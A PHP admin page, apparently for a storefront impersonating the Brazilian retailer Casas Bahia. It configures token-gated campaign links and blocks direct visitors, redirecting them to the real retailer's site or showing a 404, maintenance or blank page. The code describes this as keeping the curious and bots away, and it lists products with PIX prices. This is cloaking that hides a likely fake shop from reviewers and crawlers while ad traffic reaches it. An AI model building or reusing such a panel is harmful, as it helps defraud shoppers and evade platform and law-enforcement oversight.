<?php
require_once __DIR__ . '/../config/database.php';
require_once __DIR__ . '/auth.php';

requireLogin();

$db = getDBConnection();
$message = '';
$error = '';

// Processar formulários POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    // 1. Salvar Configurações Gerais de Bloqueio
    if ($action === 'save_settings') {
        $isEnabled = isset($_POST['is_enabled']) ? 1 : 0;
        $blockAction = trim($_POST['block_action'] ?? 'redirect');
        $redirectUrl = trim($_POST['redirect_url'] ?? 'https://www.casasbahia.com.br');
        $paramName = trim($_POST['param_name'] ?? 'src');
        $masterToken = trim($_POST['master_token'] ?? 'promo');
        $sessionDuration = intval($_POST['session_duration_hours'] ?? 24);

        if (empty($paramName)) $paramName = 'src';
        if (empty($masterToken)) $masterToken = 'promo';
        if ($sessionDuration < 1) $sessionDuration = 24;

        try {
            $stmt = $db->prepare("
                UPDATE access_control_settings SET
                    is_enabled = :enabled,
                    block_action = :action,
                    redirect_url = :url,
                    param_name = :param,
                    master_token = :mtoken,
                    session_duration_hours = :duration
                WHERE id = 1
            ");
            $stmt->execute([
                'enabled' => $isEnabled,
                'action' => $blockAction,
                'url' => $redirectUrl,
                'param' => $paramName,
                'mtoken' => $masterToken,
                'duration' => $sessionDuration
            ]);
            $message = "Configurações de proteção salvas com sucesso!";
        } catch (Exception $e) {
            $error = "Erro ao salvar configurações: " . $e->getMessage();
        }
    }

    // 2. Gerar Novo Link de Acesso
    else if ($action === 'create_link') {
        $name = trim($_POST['name'] ?? '');
        $targetType = trim($_POST['target_type'] ?? 'home');
        $targetId = ($targetType === 'product') ? intval($_POST['product_id'] ?? 0) : null;
        $token = trim($_POST['token'] ?? '');

        if (empty($name)) {
            $name = ($targetType === 'home') ? 'Campanha Home Geral' : 'Campanha Produto #' . $targetId;
        }

        if (empty($token)) {
            // Gerar token aleatório amigável
            $token = 'cb_' . substr(md5(uniqid(rand(), true)), 0, 8);
        } else {
            // Limpar caracteres especiais do token
            $token = preg_replace('/[^a-zA-Z0-9_-]/', '', $token);
        }

        if ($targetType === 'product' && empty($targetId)) {
            $error = "Por favor, selecione um produto válido para o link.";
        } else {
            try {
                // Verificar se token já existe
                $checkStmt = $db->prepare("SELECT COUNT(*) FROM access_links WHERE token = :tok");
                $checkStmt->execute(['tok' => $token]);
                if ($checkStmt->fetchColumn() > 0) {
                    $token .= '_' . rand(100, 999);
                }

                $stmt = $db->prepare("
                    INSERT INTO access_links (name, target_type, target_id, token, clicks_count, is_active)
                    VALUES (:name, :type, :target_id, :token, 0, 1)
                ");
                $stmt->execute([
                    'name' => $name,
                    'type' => $targetType,
                    'target_id' => $targetId,
                    'token' => $token
                ]);
                $message = "Link seguro gerado com sucesso!";
            } catch (Exception $e) {
                $error = "Erro ao criar link: " . $e->getMessage();
            }
        }
    }
}

// Carregar Configurações Atuais
$settings = [
    'is_enabled' => 1,
    'block_action' => 'redirect',
    'redirect_url' => 'https://www.casasbahia.com.br',
    'param_name' => 'src',
    'master_token' => 'promo',
    'session_duration_hours' => 24
];

try {
    $stmtS = $db->query("SELECT * FROM access_control_settings WHERE id = 1 LIMIT 1");
    $dbSettings = $stmtS->fetch();
    if ($dbSettings) {
        $settings = array_merge($settings, $dbSettings);
    }
} catch (Exception $e) {}

// Carregar Produtos para o Dropdown
$products = [];
try {
    $stmtP = $db->query("SELECT id, title, regular_price, pix_price FROM products ORDER BY id DESC");
    $products = $stmtP->fetchAll();
} catch (Exception $e) {}

// Carregar Links Gerados
$accessLinks = [];
$totalClicks = 0;
try {
    $stmtL = $db->query("
        SELECT al.*, p.title as product_title 
        FROM access_links al
        LEFT JOIN products p ON al.target_id = p.id
        ORDER BY al.id DESC
    ");
    $accessLinks = $stmtL->fetchAll();
    foreach ($accessLinks as $l) {
        $totalClicks += intval($l['clicks_count'] ?? 0);
    }
} catch (Exception $e) {}

// Montar Base URL atual do site
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$currentPath = dirname($_SERVER['SCRIPT_NAME']);
$basePath = preg_replace('/\/admin.*$/i', '', $currentPath);
$baseUrl = rtrim($protocol . $host . $basePath, '/');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Links & Bloqueio de Domínio | Painel Admin Casas Bahia</title>
  <style>
    :root {
      --primary: #003399;
      --primary-dark: #002266;
      --bg-gray: #f4f6f9;
      --sidebar-width: 240px;
      --success: #168019;
      --danger: #e30613;
      --warning: #f59e0b;
      --card-border: #e2e8f0;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body { background-color: var(--bg-gray); color: #333333; display: flex; min-height: 100vh; }

    /* SIDEBAR (BARRA LATERAL) */
    .admin-sidebar { width: var(--sidebar-width); background: #001a4d; color: #ffffff; display: flex; flex-direction: column; position: fixed; top: 0; bottom: 0; left: 0; z-index: 100; box-shadow: 4px 0 12px rgba(0,0,0,0.05); }
    .sidebar-brand { padding: 24px 20px; border-bottom: 1px solid rgba(255,255,255,0.1); }
    .brand-logo-admin { font-size: 20px; font-weight: 900; color: #ffffff; letter-spacing: -0.5px; }
    .brand-logo-admin span { color: #e30613; }
    .sidebar-badge-tag { font-size: 11px; color: #94a3b8; font-weight: 600; margin-top: 4px; text-transform: uppercase; letter-spacing: 0.5px; }

    .sidebar-nav { padding: 20px 0; flex: 1; }
    .sidebar-nav ul { list-style: none; padding: 0; margin: 0; }
    .sidebar-nav li a { display: flex; align-items: center; gap: 12px; padding: 14px 20px; color: #cbd5e1; text-decoration: none; font-size: 15px; font-weight: 600; transition: all 0.2s ease; border-left: 4px solid transparent; }
    .sidebar-nav li a:hover, .sidebar-nav li a.active { background: rgba(255,255,255,0.08); color: #ffffff; border-left-color: #38bdf8; }

    .sidebar-user-footer { padding: 16px 20px; border-top: 1px solid rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: space-between; }
    .user-info { display: flex; align-items: center; gap: 10px; }
    .user-avatar-circle { width: 34px; height: 34px; background: var(--primary); color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 14px; }
    .user-details { display: flex; flex-direction: column; }
    .user-name { font-size: 13px; font-weight: 700; color: #ffffff; }
    .user-role { font-size: 11px; color: #4ade80; }
    .btn-sidebar-logout { color: #94a3b8; display: flex; align-items: center; justify-content: center; padding: 6px; border-radius: 6px; text-decoration: none; }

    /* MAIN CONTENT */
    .admin-main-wrapper { margin-left: var(--sidebar-width); flex: 1; padding: 32px 36px; max-width: 1200px; }
    .dashboard-header { margin-bottom: 24px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 16px; }
    .page-main-title { font-size: 26px; font-weight: 900; color: #1e293b; display: flex; align-items: center; gap: 12px; }
    
    .status-badge { display: inline-flex; align-items: center; gap: 6px; padding: 6px 14px; border-radius: 20px; font-size: 13px; font-weight: 800; }
    .status-badge.active { background: #dcfce7; color: #15803d; border: 1px solid #86efac; }
    .status-badge.inactive { background: #fee2e2; color: #b91c1c; border: 1px solid #fca5a5; }
    .status-badge .dot { width: 8px; height: 8px; border-radius: 50%; }
    .status-badge.active .dot { background: #16a34a; }
    .status-badge.inactive .dot { background: #dc2626; }

    /* STATS ROW */
    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 28px; }
    .stat-card { background: #ffffff; border-radius: 12px; border: 1px solid var(--card-border); padding: 20px; display: flex; align-items: center; gap: 16px; box-shadow: 0 2px 6px rgba(0,0,0,0.02); }
    .stat-icon { width: 48px; height: 48px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 22px; }
    .stat-val { font-size: 24px; font-weight: 900; color: #1e293b; line-height: 1.2; }
    .stat-lbl { font-size: 12px; color: #64748b; font-weight: 700; text-transform: uppercase; margin-top: 2px; }

    /* LAYOUT CARDS */
    .grid-2col { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 28px; }
    @media (max-width: 960px) { .grid-2col { grid-template-columns: 1fr; } }

    .admin-card { background: #ffffff; border-radius: 12px; border: 1px solid var(--card-border); padding: 24px 28px; box-shadow: 0 2px 10px rgba(0,0,0,0.02); }
    .card-title { font-size: 18px; font-weight: 800; color: #1e293b; margin-bottom: 18px; display: flex; align-items: center; gap: 8px; }

    .form-group { margin-bottom: 18px; }
    .form-group label { display: block; font-size: 13px; font-weight: 700; color: #334155; margin-bottom: 6px; }
    .form-group .help-text { font-size: 12px; color: #64748b; margin-top: 4px; line-height: 1.4; }
    .form-control { width: 100%; padding: 10px 14px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; color: #1e293b; background: #ffffff; transition: border-color 0.2s; }
    .form-control:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 3px rgba(0, 51, 153, 0.1); }
    select.form-control { cursor: pointer; }

    /* SWITCH TOGGLE */
    .switch-container { display: flex; align-items: center; justify-content: space-between; padding: 14px 18px; background: #f8fafc; border-radius: 10px; border: 1px solid #e2e8f0; margin-bottom: 20px; }
    .switch-label { font-size: 14px; font-weight: 800; color: #1e293b; }
    .switch-sub { font-size: 12px; color: #64748b; font-weight: normal; margin-top: 2px; }
    .toggle-switch { position: relative; display: inline-block; width: 50px; height: 26px; }
    .toggle-switch input { opacity: 0; width: 0; height: 0; }
    .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #cbd5e1; transition: .3s; border-radius: 34px; }
    .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
    input:checked + .slider { background-color: var(--success); }
    input:checked + .slider:before { transform: translateX(24px); }

    /* BUTTONS */
    .btn-submit { background: var(--primary); color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: 800; font-size: 14px; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; transition: background-color 0.2s; }
    .btn-submit:hover { background: var(--primary-dark); }
    .btn-generate { background: var(--success); color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: 800; font-size: 14px; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; width: 100%; justify-content: center; transition: background 0.2s; }
    .btn-generate:hover { background: #136915; }

    /* TABLE */
    .table-responsive { overflow-x: auto; margin-top: 14px; }
    .links-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: left; }
    .links-table th { background: #f8fafc; padding: 12px 16px; border-bottom: 2px solid #e2e8f0; font-weight: 700; color: #475569; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; }
    .links-table td { padding: 14px 16px; border-bottom: 1px solid #f1f5f9; vertical-align: middle; }
    .links-table tr:hover { background: #f8fafc; }

    .badge-dest { padding: 4px 10px; border-radius: 6px; font-size: 12px; font-weight: 700; display: inline-flex; align-items: center; gap: 4px; }
    .badge-dest.home { background: #e0f2fe; color: #0369a1; border: 1px solid #bae6fd; }
    .badge-dest.prod { background: #fef3c7; color: #b45309; border: 1px solid #fde68a; }

    .clicks-badge { background: #f1f5f9; color: #003399; font-weight: 900; font-size: 13px; padding: 4px 10px; border-radius: 6px; border: 1px solid #cbd5e1; }

    .link-copy-box { display: flex; align-items: center; gap: 6px; background: #f8fafc; padding: 6px 10px; border-radius: 6px; border: 1px solid #e2e8f0; font-family: monospace; font-size: 12px; color: #334155; word-break: break-all; max-width: 320px; }
    .btn-table-copy { background: #0284c7; color: white; border: none; padding: 6px 10px; border-radius: 4px; font-size: 12px; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; gap: 4px; white-space: nowrap; transition: background 0.2s; }
    .btn-table-copy:hover { background: #0369a1; }
    .btn-table-test { background: #64748b; color: white; text-decoration: none; padding: 6px 10px; border-radius: 4px; font-size: 12px; font-weight: 700; display: inline-flex; align-items: center; gap: 4px; white-space: nowrap; }
    .btn-table-del { background: var(--danger); color: white; text-decoration: none; padding: 6px 10px; border-radius: 4px; font-size: 12px; font-weight: 700; display: inline-flex; align-items: center; }

    .alert-success { background: #f0fdf4; color: #15803d; border: 1px solid #bbf7d0; padding: 14px 18px; border-radius: 8px; font-size: 14px; font-weight: 700; margin-bottom: 24px; }
    .alert-danger { background: #fef2f2; color: #b91c1c; border: 1px solid #fecaca; padding: 14px 18px; border-radius: 8px; font-size: 14px; font-weight: 700; margin-bottom: 24px; }

    .master-link-banner { background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 10px; padding: 16px 20px; margin-bottom: 24px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px; }
    .master-link-banner strong { color: #1e40af; font-size: 14px; }
    .master-link-banner p { color: #3b82f6; font-size: 13px; margin-top: 2px; }
  </style>
</head>
<body>

  <!-- BARRA LATERAL (SIDEBAR) -->
  <?php include __DIR__ . '/sidebar.php'; ?>

  <!-- CONTEÚDO PRINCIPAL -->
  <div class="admin-main-wrapper">

    <div class="dashboard-header">
      <div>
        <h1 class="page-main-title">
          🛡️ Bloqueio de Domínio & Gerador de Links
        </h1>
        <p style="color: #64748b; font-size: 14px; margin-top: 4px;">
          Impeça que curiosos e robôs acessem seu domínio seco diretamente. Libere o catálogo apenas para visitantes que clicarem nos seus links autorizados.
        </p>
      </div>

      <div>
        <?php if ($settings['is_enabled']): ?>
          <span class="status-badge active">
            <span class="dot"></span>
            PROTEÇÃO ATIVA
          </span>
        <?php else: ?>
          <span class="status-badge inactive">
            <span class="dot"></span>
            PROTEÇÃO DESATIVADA
          </span>
        <?php endif; ?>
      </div>
    </div>

    <!-- MENSAGENS -->
    <?php if (!empty($message)): ?>
      <div class="alert-success">✅ <?= htmlspecialchars($message) ?></div>
    <?php endif; ?>
    <?php if (!empty($error)): ?>
      <div class="alert-danger">⚠️ <?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <!-- ESTATÍSTICAS RÁPIDAS -->
    <div class="stats-grid">
      <div class="stat-card">
        <div class="stat-icon" style="background: #e0f2fe; color: #0284c7;">🔗</div>
        <div>
          <div class="stat-val"><?= count($accessLinks) ?></div>
          <div class="stat-lbl">Links de Campanha Criados</div>
        </div>
      </div>

      <div class="stat-card">
        <div class="stat-icon" style="background: #dcfce7; color: #16a34a;">👥</div>
        <div>
          <div class="stat-val"><?= number_format($totalClicks, 0, ',', '.') ?></div>
          <div class="stat-lbl">Cliques / Acessos Validados</div>
        </div>
      </div>

      <div class="stat-card">
        <div class="stat-icon" style="background: #fef3c7; color: #d97706;">⚡</div>
        <div>
          <div class="stat-val"><?= htmlspecialchars($settings['param_name']) ?>=<?= htmlspecialchars($settings['master_token']) ?></div>
          <div class="stat-lbl">Chave Mestra Global</div>
        </div>
      </div>
    </div>

    <!-- BANNER CHAVE MESTRA -->
    <div class="master-link-banner">
      <div>
        <strong>🔑 Link Seguro Mestre (Home)</strong>
        <p>Abre a loja inteira e desbloqueia qualquer página sem precisar criar campanhas específicas.</p>
      </div>
      <div style="display: flex; gap: 8px; align-items: center;">
        <?php 
          $masterHomeUrl = $baseUrl . '/home.php?' . urlencode($settings['param_name']) . '=' . urlencode($settings['master_token']);
        ?>
        <input type="text" readonly value="<?= htmlspecialchars($masterHomeUrl) ?>" style="padding: 8px 12px; font-family: monospace; font-size: 13px; border: 1px solid #cbd5e1; border-radius: 6px; width: 340px; background: #fff;" id="masterInput">
        <button type="button" class="btn-table-copy" onclick="copyCustomText(this, '<?= addslashes($masterHomeUrl) ?>')">📋 Copiar Link Mestre</button>
      </div>
    </div>

    <!-- DUAS COLUNAS: CONFIGURAÇÕES GERAIS E GERADOR DE LINKS -->
    <div class="grid-2col">

      <!-- COLUNA 1: CONFIGURAÇÕES DE PROTEÇÃO -->
      <div class="admin-card">
        <h2 class="card-title">⚙️ Configurações de Bloqueio</h2>

        <form method="POST" action="links.php">
          <input type="hidden" name="action" value="save_settings">

          <div class="switch-container">
            <div>
              <div class="switch-label">Bloquear Acesso por Domínio Seco</div>
              <div class="switch-sub">Quem entrar digitando apenas o domínio sem link seguro será barrado.</div>
            </div>
            <label class="toggle-switch">
              <input type="checkbox" name="is_enabled" value="1" <?= $settings['is_enabled'] ? 'checked' : '' ?>>
              <span class="slider"></span>
            </label>
          </div>

          <div class="form-group">
            <label>Ação ao Detectar Acesso Direto (Bloqueio):</label>
            <select name="block_action" id="blockActionSelect" class="form-control" onchange="toggleRedirectInput()">
              <option value="redirect" <?= $settings['block_action'] === 'redirect' ? 'selected' : '' ?>>Redirecionar para URL Externa (Recomendado)</option>
              <option value="404" <?= $settings['block_action'] === '404' ? 'selected' : '' ?>>Exibir Erro 404 (Página Não Encontrada)</option>
              <option value="maintenance" <?= $settings['block_action'] === 'maintenance' ? 'selected' : '' ?>>Exibir Tela de Loja em Manutenção</option>
              <option value="blank" <?= $settings['block_action'] === 'blank' ? 'selected' : '' ?>>Exibir Tela em Branco</option>
            </select>
          </div>

          <div class="form-group" id="redirectUrlGroup">
            <label>URL de Redirecionamento:</label>
            <input type="url" name="redirect_url" class="form-control" value="<?= htmlspecialchars($settings['redirect_url']) ?>" placeholder="https://www.casasbahia.com.br">
            <div class="help-text">Para onde o visitante não autorizado será enviado (Ex: Casas Bahia oficial, Google, etc).</div>
          </div>

          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 14px;">
            <div class="form-group">
              <label>Nome do Parâmetro da URL:</label>
              <input type="text" name="param_name" class="form-control" value="<?= htmlspecialchars($settings['param_name']) ?>" placeholder="src">
              <div class="help-text">Ex: <code>src</code> gerará <code>?src=seu_token</code></div>
            </div>

            <div class="form-group">
              <label>Token Mestre Global:</label>
              <input type="text" name="master_token" class="form-control" value="<?= htmlspecialchars($settings['master_token']) ?>" placeholder="promo">
              <div class="help-text">Chave que desbloqueia qualquer página.</div>
            </div>
          </div>

          <div class="form-group">
            <label>Duração da Sessão Autorizada (Horas):</label>
            <input type="number" min="1" max="720" name="session_duration_hours" class="form-control" value="<?= htmlspecialchars($settings['session_duration_hours']) ?>">
            <div class="help-text">Tempo que o cliente continua autorizado a navegar na loja após entrar pelo link seguro (padrão: 24 horas).</div>
          </div>

          <button type="submit" class="btn-submit">💾 Salvar Configurações de Bloqueio</button>
        </form>
      </div>

      <!-- COLUNA 2: GERADOR DE LINKS DE CAMPANHA -->
      <div class="admin-card">
        <h2 class="card-title">⚡ Gerar Link de Campanha Seguro</h2>

        <form method="POST" action="links.php">
          <input type="hidden" name="action" value="create_link">

          <div class="form-group">
            <label>Destino do Link:</label>
            <select name="target_type" id="targetTypeSelect" class="form-control" onchange="toggleTargetProduct()">
              <option value="home">🏠 Página Inicial (Home / Vitrine)</option>
              <option value="product">📦 Produto Específico do Catálogo</option>
            </select>
          </div>

          <div class="form-group" id="productSelectGroup" style="display: none;">
            <label>Selecione o Produto:</label>
            <select name="product_id" id="productIdSelect" class="form-control" onchange="updatePreviewLink()">
              <option value="">-- Escolha um Produto Cadastrado --</option>
              <?php foreach ($products as $p): ?>
                <option value="<?= $p['id'] ?>">#<?= $p['id'] ?> - <?= htmlspecialchars(mb_strimwidth($p['title'], 0, 50, '...')) ?> (R$ <?= number_format($p['pix_price'], 2, ',', '.') ?>)</option>
              <?php endforeach; ?>
            </select>
          </div>

          <div class="form-group">
            <label>Nome / Identificador da Campanha:</label>
            <input type="text" name="name" id="campaignNameInput" class="form-control" placeholder="Ex: Anúncio Facebook - Air Fryer" oninput="autoFillToken(this.value)">
            <div class="help-text">Nome para você organizar e rastrear no painel.</div>
          </div>

          <div class="form-group">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
              <label style="margin-bottom: 0;">Código / Token do Link:</label>
              <button type="button" onclick="generateRandomToken()" style="background: none; border: none; color: #0284c7; font-size: 12px; font-weight: 700; cursor: pointer;">🎲 Gerar Aleatório</button>
            </div>
            <input type="text" name="token" id="tokenInput" class="form-control" placeholder="Ex: fb_airfryer_01" oninput="updatePreviewLink()">
            <div class="help-text">Identificador seguro que valida o acesso do cliente.</div>
          </div>

          <!-- PRÉ-VISUALIZAÇÃO DO LINK -->
          <div class="form-group" style="background: #f8fafc; padding: 12px 14px; border-radius: 8px; border: 1px dashed #cbd5e1;">
            <label style="color: #64748b; font-size: 11px;">PRÉVIA DO LINK GERADO:</label>
            <div id="previewLinkBox" style="font-family: monospace; font-size: 12px; color: #003399; font-weight: bold; word-break: break-all; margin-top: 4px;">
              <?= htmlspecialchars($baseUrl) ?>/home.php?<?= htmlspecialchars($settings['param_name']) ?>=...
            </div>
          </div>

          <button type="submit" class="btn-generate">✨ Criar Link de Campanha</button>
        </form>
      </div>

    </div>

    <!-- TABELA DE LINKS GERADOS -->
    <div class="admin-card">
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; flex-wrap: wrap; gap: 10px;">
        <h2 class="card-title" style="margin-bottom: 0;">📋 Links Ativos Cadastrados</h2>
        <span style="font-size: 13px; color: #64748b; font-weight: 600;">Total: <?= count($accessLinks) ?> links gerados</span>
      </div>

      <?php if (empty($accessLinks)): ?>
        <div style="text-align: center; padding: 36px 20px; color: #64748b;">
          <div style="font-size: 36px; margin-bottom: 10px;">🔗</div>
          <strong style="font-size: 15px; color: #334155;">Nenhum link de campanha personalizado criado ainda</strong>
          <p style="font-size: 13px; margin-top: 6px;">Use o gerador acima para criar links seguros para seus anúncios ou utilize o Link Mestre.</p>
        </div>
      <?php else: ?>
        <div class="table-responsive">
          <table class="links-table">
            <thead>
              <tr>
                <th>Campanha</th>
                <th>Destino</th>
                <th>Token</th>
                <th>Link de Acesso Seguro</th>
                <th>Cliques</th>
                <th>Criado em</th>
                <th>Ações</th>
              </tr>
            </thead>
            <tbody>
              <?php foreach ($accessLinks as $link): ?>
                <?php
                  if ($link['target_type'] === 'product' && !empty($link['target_id'])) {
                      $fullUrl = $baseUrl . '/index.php?id=' . $link['target_id'] . '&' . urlencode($settings['param_name']) . '=' . urlencode($link['token']);
                  } else {
                      $fullUrl = $baseUrl . '/home.php?' . urlencode($settings['param_name']) . '=' . urlencode($link['token']);
                  }
                ?>
                <tr>
                  <td>
                    <strong style="color: #1e293b;"><?= htmlspecialchars($link['name']) ?></strong>
                  </td>
                  <td>
                    <?php if ($link['target_type'] === 'product'): ?>
                      <span class="badge-dest prod">
                        📦 Produto: <?= htmlspecialchars(mb_strimwidth($link['product_title'] ?? ('ID #' . $link['target_id']), 0, 28, '...')) ?>
                      </span>
                    <?php else: ?>
                      <span class="badge-dest home">
                        🏠 Página Inicial
                      </span>
                    <?php endif; ?>
                  </td>
                  <td>
                    <span style="font-family: monospace; font-weight: bold; color: #003399; background: #eff6ff; padding: 2px 6px; border-radius: 4px;">
                      <?= htmlspecialchars($link['token']) ?>
                    </span>
                  </td>
                  <td>
                    <div style="display: flex; gap: 6px; align-items: center;">
                      <div class="link-copy-box" title="<?= htmlspecialchars($fullUrl) ?>">
                        <?= htmlspecialchars(mb_strimwidth($fullUrl, 0, 45, '...')) ?>
                      </div>
                      <button type="button" class="btn-table-copy" onclick="copyCustomText(this, '<?= addslashes($fullUrl) ?>')" title="Copiar link completo">📋 Copiar</button>
                    </div>
                  </td>
                  <td>
                    <span class="clicks-badge"><?= intval($link['clicks_count']) ?> acessos</span>
                  </td>
                  <td style="color: #64748b; font-size: 12px;">
                    <?= date('d/m/Y H:i', strtotime($link['created_at'])) ?>
                  </td>
                  <td>
                    <div style="display: flex; gap: 6px;">
                      <a href="<?= htmlspecialchars($fullUrl) ?>" target="_blank" class="btn-table-test" title="Testar link">🔗 Testar</a>
                      <a href="link_delete.php?id=<?= $link['id'] ?>" class="btn-table-del" onclick="return confirm('Deseja realmente excluir este link de campanha?')" title="Excluir">🗑️</a>
                    </div>
                  </td>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </div>
      <?php endif; ?>

    </div>

  </div>

  <script>
    const baseUrl = "<?= addslashes($baseUrl) ?>";
    const paramName = "<?= addslashes($settings['param_name']) ?>";

    function toggleRedirectInput() {
      const select = document.getElementById('blockActionSelect');
      const group = document.getElementById('redirectUrlGroup');
      if (select.value === 'redirect') {
        group.style.display = 'block';
      } else {
        group.style.display = 'none';
      }
    }

    function toggleTargetProduct() {
      const targetType = document.getElementById('targetTypeSelect').value;
      const prodGroup = document.getElementById('productSelectGroup');
      if (targetType === 'product') {
        prodGroup.style.display = 'block';
      } else {
        prodGroup.style.display = 'none';
      }
      updatePreviewLink();
    }

    function autoFillToken(val) {
      const tokenInput = document.getElementById('tokenInput');
      if (tokenInput.dataset.manual !== '1') {
        const clean = val.toLowerCase().trim()
          .normalize('NFD').replace(/[\u0300-\u036f]/g, '')
          .replace(/[^a-z0-9]/g, '_')
          .replace(/_+/g, '_');
        tokenInput.value = clean.substring(0, 20);
        updatePreviewLink();
      }
    }

    function generateRandomToken() {
      const randStr = 'cb_' + Math.random().toString(36).substring(2, 9);
      const tokenInput = document.getElementById('tokenInput');
      tokenInput.value = randStr;
      tokenInput.dataset.manual = '1';
      updatePreviewLink();
    }

    function updatePreviewLink() {
      const targetType = document.getElementById('targetTypeSelect').value;
      const productId = document.getElementById('productIdSelect').value;
      const token = document.getElementById('tokenInput').value || 'TOKEN';
      const previewBox = document.getElementById('previewLinkBox');

      let link = baseUrl;
      if (targetType === 'product' && productId) {
        link += '/index.php?id=' + productId + '&' + encodeURIComponent(paramName) + '=' + encodeURIComponent(token);
      } else {
        link += '/home.php?' + encodeURIComponent(paramName) + '=' + encodeURIComponent(token);
      }

      previewBox.innerText = link;
    }

    function copyCustomText(btn, text) {
      if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text).then(function() {
          showCopiedState(btn);
        }).catch(function() {
          fallbackCopy(text, btn);
        });
      } else {
        fallbackCopy(text, btn);
      }
    }

    function fallbackCopy(text, btn) {
      const tempInput = document.createElement('input');
      tempInput.value = text;
      document.body.appendChild(tempInput);
      tempInput.select();
      document.execCommand('copy');
      document.body.removeChild(tempInput);
      showCopiedState(btn);
    }

    function showCopiedState(btn) {
      const originalText = btn.innerHTML;
      btn.innerHTML = '✅ Copiado!';
      btn.style.backgroundColor = '#168019';
      setTimeout(function() {
        btn.innerHTML = originalText;
        btn.style.backgroundColor = '';
      }, 2000);
    }

    // Inicialização
    document.addEventListener('DOMContentLoaded', function() {
      toggleRedirectInput();
      updatePreviewLink();

      document.getElementById('tokenInput').addEventListener('input', function() {
        this.dataset.manual = '1';
        updatePreviewLink();
      });
    });
  </script>

</body>
</html>
